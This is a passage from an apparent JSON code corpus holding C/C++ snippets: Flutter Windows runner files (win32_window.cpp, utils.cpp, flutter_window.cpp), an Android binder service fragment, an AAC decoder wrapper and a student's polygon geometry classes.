instance.c_str());\n    CHECK(status == STATUS_OK);\n\n    ABinderProcess_joinThreadPool();\n    return EXIT_FAILURE;  // should not reach\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright (c) 2018, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n * */\n\n#include \"aacDecode.h\"\n#include \"aacdecoder_lib.h\"\n#include <utils/Log.h>\n#include <string.h>\n\naacDecode::aacDecode() {\n    p_aacHandle = NULL;\n    p_aacInfo = NULL;\n    memset(&s_aacConfig, 0, sizeof(s_aacConfig));\n}\n\naacDecode::~aacDecode() {\n    if(!p_aacHandle) {\n        return;\n    }\n\n    aacDecoder_Close((HANDLE_AACDECODER)p_aacHandle);\n    p_aacHandle = NULL;\n}\n\nbool aacDecode::aacConfigure(aacConfigType * p_aacConfig) {\n    if(!p_aacConfig) {\n        return false;\n    }\n\n    memcpy(&s_aacConfig, p_aacConfig, sizeof(s_aacConfig));\n\n    p_aacHandle = aacDecoder_Open(TT_MP4_ADTS, 1);\n\n    if(!p_aacHandle) {\n        ALOGE(\"Failed to open AAC decoder\");\n        return false;\n    }\n\n    p_aacInfo = (void*)aacDecoder_GetStreamInfo((HANDLE_AACDECODER)p_aacHandle);\n\n    if(!p_aacInfo) {\n        ALOGE(\"Failed to get stream info\");\n        return false;\n    }\n\n    /* Configure AAC decoder */\n\n    aacDecoder_SetParam((HANDLE_AACDECODER)p_aacHandle,\n                        AAC_DRC_REFERENCE_LEVEL,\n                        64);\n\n    aacDecoder_SetParam((HANDLE_AACDECODER)p_aacHandle,\n                        AAC_DRC_ATTENUATION_FACTOR,\n                        127);\n\n    aacDecoder_SetParam((HANDLE_AACDECODER)p_aacHandle,\n                        AAC_PCM_MAX_OUTPUT_CHANNELS,\n                        s_aacConfig.n_channels > 6 ? -1 : s_aacConfig.n_channels);\n    return true;\n}\n\nbool aacDecode::aacDecodeFrame(unsigned char* p_buffer, unsigned int n_size) {\n    if(!p_buffer || n_size < 7) {\n        ALOGE(\"No/Incorrect buffer provided for AAC decoder\");\n        return false;\n    }\n\n    if(!p_aacHandle) {\n        ALOGE(\"Decoder handle not available\");\n        return false;\n    }\n\n    AAC_DECODER_ERROR err = AAC_DEC_UNKNOWN;\n\n    UINT nSize[] = {(UINT)n_size};\n    UINT nOcc[] = {(UINT)n_size};\n    UCHAR* pBuf[] = {p_buffer};\n\n    err = aacDecoder_Fill((HANDLE_AACDECODER)p_aacHandle, pBuf, nSize, nOcc);\n\n    if(err != AAC_DEC_OK || nOcc[0] != 0) {\n        ALOGE(\"Error in aacDecoder_Fill\");\n        return false;\n    }\n\n    /* Fix the alloc length being passed to AAC Decoder since it expects INT_PCM\n       as input buffer but we have it as UINT8. INT_PCM is of type SHORT */\n\n    int factor = sizeof(INT_PCM)/sizeof(unsigned char);\n    int allocLen = (factor == 0) ? n_size : n_size/factor;\n\n    err = aacDecoder_DecodeFrame((HANDLE_AACDECODER)p_aacHandle,\n                                  (INT_PCM*)p_buffer, allocLen, 0);\n\n    if(err != AAC_DEC_OK) {\n        ALOGE(\"Failed to decode frame\");\n        return false;\n    }\n    return true;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n * Poligono.cc\n *\n *  Created on: 18/03/2024\n *      Author: adrian\n */\n\n#include <iostream>\n#include <math.h>\n#include \"Poligono.hpp\"\nusing namespace std;\nbool IgDouble(const double& n1, const double& n2);\nvoid OrdenaDouble( double* n, const int& cantVert);\n\nPoligono::Poligono()\n{\n\tcout << \"En constructor de Poligono sin argumentos\" << endl;\n\tcantVert=0;\n\tvert = NULL;\n}\n\nPoligono::Poligono( int n, const Complejo pto[] )\n{\n\tcantVert=n;\n\tvert = new Complejo[cantVert];\n\n\n\t//cout << \"En constructor de Poligono, this= \" << (this)  << \" y direccion de vert= \" << (vert) << \", con vertices:\" << endl;\n\tfor( int i=0; i < cantVert; i++ )\n\t{\n\t\tvert[i] = pto[i];\n\t}\n}\nPoligono::~Poligono()\n{\n\tcout << \"En destructor de Poligono con cantVert=\" << cantVert << \", liberara mem de vert= \" << vert << endl;\n\tif( cantVert > 0 )\n\t\tdelete []vert;\n}\n//\nstd::ostream& operator<< (std::ostream& os, const Poligono& p)\n{\n\tfor( int i = 0; i < p.GetCantVert(); i++)\n\t{\n\t\tos << p.GetVert(i) << \" \";\n\t}\n\treturn os;\n}\n//\nstd::istream& operator>> (std::istream& in, Poligono& p)\n{\n\tComplejo aux(0,0);\n\n\tfor ( int i = 0; i < p.GetCantVert(); i++ )\n\t{\n\t\tin >> aux;\n\t\tp.SetVert(aux, i);\n\t}\n}\n\n// **** Triangulo ****\nTriangulo::Triangulo( const Complejo pto[]):Poligono( 3, pto )\n{\n\tcout << \"En constructor de Triangulo\" << endl;\n\t\t//valida que es un triangulo\n\t\t//evalua la propiedad que la suma de dos lados de un triangulo es mayor al restante\n\t\tdouble dist[3] = {vert[0].Distancia(pto[1]), vert[0].Distancia(pto[2]), vert[1].Distancia(pto[2])};\n\t\tif( !((dist[0] + dist[1] > dist[2]) && (dist[0] + dist[2] > dist[1]) && (dist[1] + dist[2] > dist[0])) )\n\t\t{\n\t\t\tthrow int( ERROR_NO_TRIANGULO );\n\t\t}\n}\nTriangulo::~Triangulo()\n{\n\tcout << \"En destructor Triangulo\" << endl;\n}\ndouble Triangulo::Area() const\n{\n\t//como el area del paralelogramo limitado en un extremo por dos vectores coincide con la norma del producto\n\t//vectorial de los mismos, el area del triangulo es la mitad de la del paralelogramo\n\t//Estas operaciones pueden hacerse mediante el uso de metodos de bibliotecas, pero para iniciar el estudio,\n\t//se desarrollaran completamente, considerando los puntos como vectores en el plano complejo, luego los\n\t//vectores a considerar seran los vectores diferencia (vert[1] - vert[0]), (vert[2] - vert[0])\n\n\tComplejo vecDif[2] = { ( vert[1] - vert[0] ), ( vert[2] - vert[0] ) };\n\treturn ( abs( vecDif[0].ProdVectorial(vecDif[1]) ) /2.0f );\n}\ndouble Triangulo::Perimetro() const\n{\n\t//el perimetro lo evalua como la suma de las distancias entre los vertices\n\tdouble perim( vert[0].Distancia(vert[1]) +\n\t             vert[1].Distancia(vert[2]) +\n\t             vert[2].Distancia(vert[0]) );\n\treturn perim;\n}\n// **** Rectangulo ****\nRectangulo::Rectangulo( const Complejo pto[]):Poligono( 4, pto )\n{\n\tcout << \"En constructor de Rectangulo\" << endl;\n\t//Valida rectangulo\n\t//calcula la longitud de dos lados y la diagonal, compara la diagonal con la hipotenusa calculada con los otros dos lados calculados\n\n\tdouble dist[] = { vert[0].Distancia(vert[1]), vert[0].Distancia(vert[2]), vert[0].Distancia(vert[3]) };\n\tOrdenaDouble(dist, 3);\n\tdouble h = sqrt(dist[0] * dist[0] + dist[1] * dist[1]);\n\n\tif( !(IgDouble(h, dist[2])) || IgDouble(h, 0)  )\n\t\t{\n\t\t\tthrow int(ERROR_NO_RECTANGULO);\n\t\t}\n\t}\nRectangulo::~Rectangulo()\n{\n\tcout << \"En destructor Rectangulo\" << endl;\n}\ndouble Rectangulo::Area() const\n{\n\t//como el area del rectangulo es igual al producto de base por su altura, se evaluan las distancias de\n\t//un vertice a los tres restantes y se multiplican las dos distancias menores\n\n\t\tdouble dist[] = { vert[0].Distancia(vert[1]), vert[0].Distancia(vert[2]), vert[0].Distancia(vert[3])};\n\t\tOrdenaDouble(dist, 3);\n\treturn ( dist[0] * dist[1] );\n}\ndouble Rectangulo::Perimetro() const\n{\n\t//el perimetro lo evalua como la suma de las distancias entre los vertices\n\t\tdouble dist[] = { vert[0].Distancia(vert[1]), vert[0].Distancia(vert[2]), vert[0].Distancia(vert[3]) };\n\t\tOrdenaDouble( dist, 4 );\n\treturn ( dist[0] + dist[1] ) * 2;\n}\n// **** Cuadrado ****\nCuadrado::Cuadrado( const Complejo pto[]):Rectangulo( pto )\n{\n\tcout << \"En constructor de Cuadrado\" << endl;\n\t//verifica que los vertices formen un cuadrado tomando las distancias entre un vertice y los otros 3\n\t//luego de ordenar, las dos distancias menores deben ser iguales entre si y la tercera sqrt(2) * distancia menor\n\tdouble dist[3] = {vert[0].Distancia(vert[1]),vert[0].Distancia(vert[2]), vert[0].Distancia(vert[3])};\n\t\tOrdenaDouble(dist, 3);\n\n\t\tif( !( IgDouble(dist[0], dist[1]) ) || !( IgDouble(dist[2], (sqrt(2)*dist[0]))) || dist[0] == 0 )\n\t\t{\n\t\t\tthrow int( ERROR_NO_CUADRADO );\n\t\t}\n\t}\n Cuadrado::~Cuadrado()\n{\n\tcout << \"En destructor Cuadrado\" << endl;\n}\ndouble Cuadrado::Area() const\n{\n\t//como el area del cuadrado se puede evaluar como la del rectangulo\n\treturn(Rectangulo::Area());\n}\n//\ndouble Cuadrado::Perimetro() const\n{\n//como el perimetro del cuadrado se puede evaluar como el del rectangulo\n\treturn(Rectangulo::Perimetro());\n}\n//auxiliar para eval",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      